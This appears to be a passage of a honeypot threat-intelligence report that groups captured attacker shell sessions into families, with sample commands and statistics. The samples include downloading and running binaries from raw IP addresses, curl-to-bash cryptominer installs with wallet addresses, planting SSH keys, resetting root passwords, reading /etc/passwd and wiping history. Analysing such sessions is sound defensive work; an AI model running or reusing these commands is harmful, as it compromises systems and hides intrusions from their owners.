`[('start', ';'), ('enable', ';'), ('config', ';'), ('system', ';'), ('linuxshell', ';'), ('shell', ';'), ('sh', ';'), ('echo', ';'), ('passwd', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('cat', '|'), ('more', ';'), ('cat', '|'), ('head', ';'), ('chmod', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', 'EOS')]`

Top operators: [('echo', 741), ('cd', 12), ('cat', 6), ('start', 3), ('enable', 3), ('config', 3), ('system', 3), ('linuxshell', 3), ('shell', 3), ('sh', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2e8d2bf6edc844fb | 07797df17a3e |      267 |               1 |
| 43b7209f451c68ba | 42edd5e1a4a9 |      291 |               1 |
| d05ff207027d0f3d | 14336eb1efad |      219 |               1 |

---

## Family 112

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.815 (±0.026)
- **Medoid Archetype**: `d02b72688a910459` (Session: `fcd24629cff2`, n_rows=9)

**Medoid Execution Snippet:**
```text
rm -rf x86_64
cd /tmp
wget http://107.172.249.148/x86_64
curl -O http://107.172.249.148/x86_64
busybox wget http://107.172.249.148/x86_64
chmod 777 x86_64
./x86_64 roots
rm -rf *
nc 1 1 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('wget', ';'), ('curl', ';'), ('busybox', ';'), ('chmod', ';'), ('PH_EXEC_1', ';')]`

Top operators: [('rm', 4), ('cd', 3), ('wget', 3), ('curl', 3), ('busybox', 3), ('chmod', 3), ('PH_EXEC_1', 3), ('echo', 1), ('sh', 1), ('PH_EXEC_2', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2f8b3187e7d849c0 | 4006dc297bdd |        8 |               1 |
| 4c3bc1d30893b6af | 1047e65493b8 |        9 |               1 |
| d02b72688a910459 | fcd24629cff2 |        9 |               1 |

---

## Family 0

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.778 (±0.079)
- **Medoid Archetype**: `361b759a6dc67807` (Session: `5fe2b990ddfb`, n_rows=2)

**Medoid Execution Snippet:**
```text
uname -s -v -n -r
nproc;nvidia-smi ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';')]`

Top operators: [('uname', 3), ('nvidia-smi', 2), ('nproc', 2), ('lscpu', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2fcbb4cf6caa8ba9 | b066135c61e1 |        3 |               1 |
| 361b759a6dc67807 | 5fe2b990ddfb |        2 |               1 |
| b759e6c04be52341 | 6d38fe29c8b8 |        2 |               1 |

---

## Family 56

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9c44d7df2a9c16dd` (Session: `efafadaf6a5a`, n_rows=1)

**Medoid Execution Snippet:**
```text
ls ;
```

**Consensus Skeleton (op, conn pairs):**
`[('ls', 'EOS')]`

Top operators: [('ls', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| cfd8d34f1a8295ef | 763ebec0bc67 |        1 |               2 |
| 9c44d7df2a9c16dd | efafadaf6a5a |        1 |               1 |

---

## Family 138

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.978 (±0.000)
- **Medoid Archetype**: `30438fc331e4295b` (Session: `a2ed1eb5e972`, n_rows=45)

**Medoid Execution Snippet:**
```text
shell
sh
>/tmp/.l && cd /tmp/
echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T
>/run//var/.l && cd /run//var/
echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T
>/dev/.l && cd /dev/
echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL ...
```

**Consensus Skeleton (op, conn pairs):**
`[('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('busybox', ';'), ('busybox', '||'), ('wget', ';'), ('busybox', '||'), ('tftp', ';'), ('busybox', '||'), ('ftpget', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', '||'), ('cp', '&&'), ('>', '&&'), ('cat', '&&'), ('rm', '||'), ('rm', '&&'), ('cp', '&&'), ('rm', '||'), ('rm', ';'), ('PH_EXEC_1', ';'), ('rm', '||'), ('rm', ';'), ('rm', '||'), ('rm', 'EOS')]`

Top operators: [('busybox', 42), ('>', 36), ('echo', 36), ('cd', 34), ('rm', 16), ('cp', 4), ('wget', 2), ('tftp', 2), ('ftpget', 2), ('chmod', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 30438fc331e4295b | a2ed1eb5e972 |       45 |               2 |
| 48b6a7e962ff8f9c | 39d03fe1105f |       43 |               1 |

---

## Family 164

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.926 (±0.000)
- **Medoid Archetype**: `a66b0e9d87387fca` (Session: `508f33ae08e6`, n_rows=12)

**Medoid Execution Snippet:**
```text
cd ~
chattr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvc ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('chattr', ';'), ('lockr', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';'), ('Enter', ';'), ('echo', '|'), ('passwd', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|')]`

Top operators: [('cd', 6), ('echo', 6), ('grep', 6), ('cat', 4), ('passwd', 4), ('awk', 4), ('chattr', 2), ('lockr', 2), ('rm', 2), ('mkdir', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a66b0e9d87387fca | 508f33ae08e6 |       12 |               2 |
| f274ed66a2ec2e0b | 65130e40cb72 |       10 |               1 |

---

## Family 52

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.875 (±0.000)
- **Medoid Archetype**: `76b6b14aa2ae9f1f` (Session: `56a4bfd7e60a`, n_rows=7)

**Medoid Execution Snippet:**
```text
sh
shell
ls /
sh
cd /tmp
rm -rf *
wget http://209.141.37.15/bins/bin.mips ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('ls', ';'), ('sh', ';'), ('cd', ';'), ('rm', ';'), ('wget', 'EOS')]`

Top operators: [('sh', 4), ('wget', 3), ('shell', 2), ('ls', 2), ('cd', 2), ('rm', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 76b6b14aa2ae9f1f | 56a4bfd7e60a |        7 |               2 |
| 882b476e91b981d7 | 994dd9427e0b |        8 |               1 |

---

## Family 75

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.867 (±0.000)
- **Medoid Archetype**: `9e9e778865205a3c` (Session: `32e4055b6674`, n_rows=13)

**Medoid Execution Snippet:**
```text
cd /tmp
rm -rf ok.sh wget 156.38.209.136/ok.sh
sh ok.sh
rm -rf ok.sh
curl -O 156.38.209.136/ok.sh
sh ok.sh
rm -rf ok.sh
history -c
wget 156.38.209.136/cnrig
chmod 777 cnrig
./cnrig --donate-level 1 -o pool.supportxmr.com:443 -u 42yA8XVUCAWKAztxYLTJ96e8pYfN5K3fQZBftWQkChTVaVuDkQskvxy9hZDFRacvo7KKGUkz ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('sh', ';'), ('rm', ';'), ('curl', ';'), ('sh', ';'), ('rm', ';'), ('chmod', ';'), ('PH_EXEC_2', ';'), ('history', ';'), ('cat', '&&'), ('history', '&&'), ('rm', 'EOS')]`

Top operators: [('rm', 7), ('history', 5), ('sh', 4), ('curl', 3), ('cd', 2), ('wget', 2), ('chmod', 2), ('PH_EXEC_2', 2), ('cat', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9e9e778865205a3c | 32e4055b6674 |       13 |               2 |
| dd8da14f251aa6c7 | c8c20d08771e |       12 |               1 |

---

## Family 136

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.857 (±0.000)
- **Medoid Archetype**: `3a02e64a0ed4f604` (Session: `0c1d8ff97253`, n_rows=2)

**Medoid Execution Snippet:**
```text
echo -e '\x67\x61\x79\x66\x67\x74'
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemTIRBiyqk8SLD3ijQpfZwQ9vsHc47hdTBfj89FeHJGGm1KpWg8lrXeMW+5jIXTFmEFhbJ18wc25Dcds4QCM0DvZGr/Pg4+kqJ0gLyqYmB2fdN ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', 'EOS')]`

Top operators: [('cd', 4), ('echo', 3), ('rm', 2), ('mkdir', 2), ('chmod', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 3a02e64a0ed4f604 | 0c1d8ff97253 |        2 |               2 |
| a27cb9e158e0768e | 96fb0bf0d304 |        1 |               1 |

---

## Family 59

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.778 (±0.000)
- **Medoid Archetype**: `2b350bdadc377e2a` (Session: `2d0c605610ac`, n_rows=6)

**Medoid Execution Snippet:**
```text
rm x86_64
wget http://205.185.121.185/x86_64
chmod 777 *
./x86_64 fw.x86
rm x86_64
curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 43FfsvebfiL9x6uHd7nc1RfLBDp8ASCfgiNLUfQxV8GtJVqdcX4brm3MiYcm2zgVRmbZoYPdn5YzgDG6ZMbRmq4x2nK337X ;
```

**Consensus Skeleton (op, conn pairs):**
`[('rm', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('curl', '|')]`

Top operators: [('rm', 4), ('wget', 2), ('chmod', 2), ('PH_EXEC_1', 2), ('curl', 2), ('bash', 2), ('curl:', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a2976c3361dc92ac | 42c674a0fbf6 |        7 |               2 |
| 2b350bdadc377e2a | 2d0c605610ac |        6 |               1 |

---

## Family 261

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `302b118aba41af49` (Session: `da55dc12cd8e`, n_rows=3)

**Medoid Execution Snippet:**
```text
wget http://45.14.165.26/test.sh
sh test.sh
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', ';'), ('sh', ';'), ('history', 'EOS')]`

Top operators: [('wget', 1), ('sh', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 302b118aba41af49 | da55dc12cd8e |        3 |               3 |

---

## Family 133

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `671ac487157730e6` (Session: `7acec9416380`, n_rows=1)

**Medoid Execution Snippet:**
```text
User-Agent: libwww-perl/6.05 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('User-Agent:', 'EOS')]`

Top operators: [('User-Agent:', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 671ac487157730e6 | 7acec9416380 |        1 |               3 |

---

## Family 284

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `69cd858c687489fb` (Session: `2304b169258a`, n_rows=6)

**Medoid Execution Snippet:**
```text
/usr/bin/nbhuuu
/usr/libexec/nbhuuu
/usr/local/bin/nbhuuu
/tmp/nbhuuu
/usr/bin/file /usr/bin/file
scp -tr /usr/bin/ ;
```

**Consensus Skeleton (op, conn pairs):**
`[('PH_EXEC_1', ';'), ('PH_EXEC_2', ';'), ('PH_EXEC_3', ';'), ('PH_EXEC_4', ';'), ('PH_EXEC_5', ';'), ('scp', 'EOS')]`

Top operators: [('PH_EXEC_1', 1), ('PH_EXEC_2', 1), ('PH_EXEC_3', 1), ('PH_EXEC_4', 1), ('PH_EXEC_5', 1), ('scp', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 69cd858c687489fb | 2304b169258a |        6 |               3 |

---

## Family 286

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `6db333ca00f6e200` (Session: `10be78cbb135`, n_rows=3)

**Medoid Execution Snippet:**
```text
echo root:ds34tij24iu33ji43r3g | chpasswd | bash
lspci | grep -i --color 'vga\ | 3d\ | 2d'
curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA ;
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('lspci', '|'), ('grep', ';'), ('curl', '|'), ('bash', 'EOS')]`

Top operators: [('bash', 2), ('echo', 1), ('chpasswd', 1), ('lspci', 1), ('grep', 1), ('curl', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 6db333ca00f6e200 | 10be78cbb135 |        3 |               3 |

---

## Family 290

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `754f0ce2fa1c9020` (Session: `4676da7b6a8a`, n_rows=2)

**Medoid Execution Snippet:**
```text
EHLO 3133302e3139322e3136362e313232.net
? ;
```

**Consensus Skeleton (op, conn pairs):**
`[('EHLO', ';'), ('?', 'EOS')]`

Top operators: [('EHLO', 1), ('?', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 754f0ce2fa1c9020 | 4676da7b6a8a |        2 |               3 |

---

## Family 151

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `093e1518dd523540` (Session: `2575f88036c7`, n_rows=6)

**Medoid Execution Snippet:**
```text
/bin/sh -c 'LANG=C
LC_ALL=C
cat /etc/passwd'
LANG=C
LC_ALL=C
cat /etc/passwd ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('cat', 'EOS')]`

Top operators: [('sh', 2), ('cat', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 093e1518dd523540 | 2575f88036c7 |        6 |               1 |
| 5d64cfded6b3c8b6 | 8615b0c3c869 |        6 |               1 |

---

## Family 253

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `0b8e74957664cb82` (Session: `8d43ffd57aa8`, n_rows=1)

**Medoid Execution Snippet:**
```text
sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', 'EOS')]`

Top operators: [('sh', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0b8e74957664cb82 | 8d43ffd57aa8 |        1 |               1 |
| 88e1887e7a2a321b | 3e4b0542c6a7 |        1 |               1 |

---

## Family 167

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `0d1b9ef3c4c0364b` (Session: `5e26249bbac2`, n_rows=2)

**Medoid Execution Snippet:**
```text
echo -n qwe
echo asd ;
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', ';'), ('echo', 'EOS')]`

Top operators: [('echo', 4)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0d1b9ef3c4c0364b | 5e26249bbac2 |        2 |               1 |
| 9823047ab95dbd47 | 740db3de7c79 |        2 |               1 |

---

## Family 278

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `176aff924dff89c1` (Session: `c2ff9c41bb9b`, n_rows=2)

**Medoid Execution Snippet:**
```text
echo -e '\x79\x65\x73\x68\x65\x6c\x6f'
cat /bin/echo ;
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', ';'), ('cat', 'EOS')]`

Top operators: [('echo', 2), ('cat', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 176aff924dff89c1 | c2ff9c41bb9b |        2 |               1 |
| 9bcc01090a9f89b4 | 34c591b319f2 |        2 |               1 |

---

## Family 95

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `2ecca6c64a2ea5f8` (Session: `0fde5e63d737`, n_rows=9)

**Medoid Execution Snippet:**
```text
nproc
cd /tmp
wget http://209.97.132.66/miner.sh
bash miner.sh
cd /tmp
curl -O http://209.97.132.66/div
wget http://209.97.132.66/div
perl div
rm -rf div* miner.sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('nproc', ';'), ('cd', ';'), ('wget', ';'), ('bash', ';'), ('cd', ';'), ('curl', ';'), ('wget', ';'), ('perl', ';'), ('rm', 'EOS')]`

Top operators: [('cd', 4), ('wget', 4), ('nproc', 2), ('bash', 2), ('curl', 2), ('perl', 2), ('rm', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2ecca6c64a2ea5f8 | 0fde5e63d737 |        9 |               1 |
| c2effc675d0429bf | ec778c2c025a |        9 |               1 |

---

## Family 163

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `3670e4e9da5c115b` (Session: `c3ec09b8b84e`, n_rows=7)

**Medoid Execution Snippet:**
```text
cd /var/tmp
curl -s -L -O 31.210.20.142/.billgates/.senpai.loader || wget --no-check-certificate 31.210.20.142/.billgates/.senpai.loader
chmod 777 .senpai.loader
./.senpai.loader
rm -rf .senpai.loader
history -c
rm -rf ~/.bash_history ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('curl', '||'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('history', ';'), ('rm', 'EOS')]`

Top operators: [('rm', 4), ('cd', 2), ('curl', 2), ('wget', 2), ('chmod', 2), ('PH_EXEC_1', 2), ('history', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 3670e4e9da5c115b | c3ec09b8b84e |        7 |               1 |
| 922322b5dea09d01 | 536d271bf8b8 |        7 |               1 |

---

## Family 116

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `489664cf87b462c1` (Session: `719199f79d97`, n_rows=1)

**Medoid Execution Snippet:**
```text
sudo hive-passwd dayone1edfjqiyhnh1 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sudo', 'EOS')]`

Top operators: [('sudo', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 489664cf87b462c1 | 719199f79d97 |        1 |               1 |
| c931058e1f87f961 | 75a062b987ba |        1 |               1 |

---

## Family 166

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `4e880be0d86d80dd` (Session: `8c6375322885`, n_rows=7)

**Medoid Execution Snippet:**
```text
uname -a
cd /tmp
wget radiodeea.hi2.ro/max.txt
perl max.txt
rm -rf max.txt
history -c
clear ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('cd', ';'), ('wget', ';'), ('perl', ';'), ('rm', ';'), ('history', ';'), ('clear', 'EOS')]`

Top operators: [('uname', 2), ('cd', 2), ('wget', 2), ('perl', 2), ('rm', 2), ('history', 2), ('clear', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 4e880be0d86d80dd | 8c6375322885 |        7 |               1 |
| afc70987d6c808cd | efbe60e7f890 |        6 |               1 |

---

## Family 105

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `56778f186e122da3` (Session: `6e9b42510f32`, n_rows=1)

**Medoid Execution Snippet:**
```text
hive-passwd 3414 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('hive-passwd', 'EOS')]`

Top operators: [('hive-passwd', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 56778f186e122da3 | 6e9b42510f32 |        1 |               1 |
| f681ab5df283786a | a5f0622db27e |        1 |               1 |

---

## Family 208

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9229e61fa03af0c0` (Session: `cf173e2eaad6`, n_rows=1)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | egrep name | wc ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', 'EOS')]`

Top operators: [('cat', 2), ('grep', 2), ('wc', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9229e61fa03af0c0 | cf173e2eaad6 |        1 |               1 |
| e90a9ab1b9baedc3 | ac09a0a54e18 |        1 |               1 |

---

## Family 238

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9b3adf2eac132037` (Session: `f4555b764bbb`, n_rows=2)

**Medoid Execution Snippet:**
```text
cat /etc/issue
hive-passwd 1 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('hive-passwd', 'EOS')]`

Top operators: [('cat', 2), ('hive-passwd', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9b3adf2eac132037 | f4555b764bbb |        2 |               1 |
| b8f5509370aa187f | 1293e8874d56 |        2 |               1 |

---

## Family 53

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `de9023b830d6224a` (Session: `a170f51c12d7`, n_rows=1)

**Medoid Execution Snippet:**
```text
Connection: close ;
```

**Consensus Skeleton (op, conn pairs):**
`[('Connection:', 'EOS')]`

Top operators: [('Connection:', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
